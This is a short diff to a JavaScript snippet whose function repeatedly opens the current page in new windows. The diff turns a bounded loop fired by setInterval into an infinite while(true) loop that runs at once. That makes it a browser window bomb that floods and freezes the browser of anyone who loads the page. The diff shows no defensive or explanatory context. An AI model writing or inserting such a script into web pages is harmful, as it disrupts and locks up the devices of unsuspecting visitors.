@@ -1,7 +1,7 @@
 function rep() {
-  for (var i = 0; i < 100; i++) {
+  while (true) {
     open(location.href);
   }
 }
 
-setInterval(rep, 0);
+rep();
